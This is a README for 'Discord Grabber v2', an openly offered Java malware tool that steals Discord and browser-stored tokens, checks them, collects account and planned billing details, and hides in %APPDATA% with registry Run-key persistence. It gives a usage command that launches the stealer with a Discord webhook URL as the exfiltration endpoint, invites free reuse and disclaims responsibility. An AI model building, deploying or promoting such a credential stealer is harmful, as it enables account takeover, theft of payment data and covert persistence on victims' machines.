# Discord Grabber v2

Discord Grabber v2 is the second version of a discord token logger, improvements from the previous version are:

- Checks whether or not the token is valid
- Provides information regarding the account
- Has a minimum amount of persistence (namely moving itself to %APPDATA% and placing itself in the Run directory of the registry

## Features
Current features include:

- Send information via discord webhook (Embed)
- Checks for Discord (Canary, PTB) tokens, Google Chrome, Brave Browser, Yandex Browser and Opera Browser
- Checks whether the token(s) is valid before sending it to avoid disabled tokens flooding the webhook
- Persists in registry (Run, RunOnce, RunServices, RunServicesOnce)
- Copies itself into %APPDATA% every time it runs (under a random UUID)

## WIP
- Send normal webhook messages (not embed)
- Check whether or not discord account has nitro
- Check the billing information (if nitro is present)


## Usage

The idea is to edit the source code yourself, edit the settings, and add the webhook. The release version  can be used but the settings can not be changed, and the webhook has to be passed as the first and only argument

```java -jar <filename>.jar https://discord.com/api/webhooks/id/token```

## Contributing
You may do with this code whatever you want, I would appreciate suggestions or if you tell me what you change, but it is not needed.

## Disclaimer
I am in no way responsible for what you do using my program/code.
